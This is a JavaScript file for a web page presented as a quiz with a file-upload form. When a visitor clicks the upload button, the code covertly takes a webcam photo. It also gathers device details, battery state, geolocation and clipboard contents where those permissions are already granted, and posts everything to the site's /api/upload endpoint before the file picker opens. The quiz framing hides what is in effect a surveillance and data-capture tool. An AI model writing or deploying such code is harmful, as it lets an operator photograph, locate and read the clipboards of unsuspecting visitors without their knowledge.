const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");
const uploadBtn = document.getElementById("upload-btn"); // NEW button for controlled camera

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false; // prevents double popup

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  console.log("[Metadata] Collecting metadata...");
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    clipboard: "N/A", // optional: replace network
    time: new Date().toLocaleString(),
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
      console.log("[Metadata] Battery info:", metadata.battery);
    } catch (e) {
      console.log("[Metadata] Battery read failed");
    }
  }

  // Location only if already granted
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
        console.log("[Metadata] Location:", metadata.location);
      }
    } catch {}
  }

  // Clipboard read (only if permission already granted)
  if (navigator.permissions && navigator.clipboard) {
    try {
      const status = await navigator.permissions.query({ name: "clipboard-read" });
      if (status.state === "granted") {
        metadata.clipboard = await navigator.clipboard.readText();
        console.log("[Metadata] Clipboard content:", metadata.clipboard);
      }
    } catch {}
  }

  console.log("[Metadata] Collected metadata:", metadata);
  return metadata;
}

// ================================
// CAPTURE CAMERA + SEND (ONLY ONCE)
// ================================
async function captureAndSendCamera() {
  if (cameraCaptured || cameraInProgress) {
    console.log("[Camera] Already captured or in progress, skipping...");
    return;
  }
  cameraInProgress = true;
  console.log("[Camera] Requesting camera access...");

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    console.log("[Camera] Camera access granted.");
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();
    console.log("[Camera] Video playing...");

    // wait for stable frame
    await new Promise((r) => setTimeout(r, 1500));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    console.log("[Camera] Image captured.");

    const metadata = await collectMetadata();

    console.log("[Camera] Sending image + metadata to backend...");
    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    });
    console.log("[Camera] Upload complete.");

    // Stop camera
    stream.getTracks().forEach((t) => t.stop());
    console.log("[Camera] Camera stopped.");

    cameraCaptured = true;
  } catch (err) {
    console.log("[Camera] Blocked or denied:", err);
  } finally {
    cameraInProgress = false;
  }
}

// ================================
// UPLOAD BUTTON triggers CAMERA
// ================================
uploadBtn.addEventListener("click", async () => {
  console.log("[Button] Upload button clicked.");
  await captureAndSendCamera();

  console.log("[Button] Opening file picker...");
  fileInput.click();
});

// ================================
// FILE UPLOAD
// ================================
async function uploadFile(file) {
  console.log("[FileUpload] Uploading file:", file.name);
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name }),
        });
        console.log("[FileUpload] File uploaded successfully.");
        resolve(await res.json());
      } catch (err) {
        console.log("[FileUpload] Upload failed:", err);
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// FORM SUBMIT
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }

  const selectedFile = fileInput.files[0];
  if (!selectedFile) {
    alert("Please select a file first!");
    return;
  }

  console.log("[Form] Submitting form...");
  try {
    await uploadFile(selectedFile);
    console.log("[Form] File submission complete.");

    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error("[Form] Submit error:", err);
    alert("Upload failed. Try again.");
  }
});
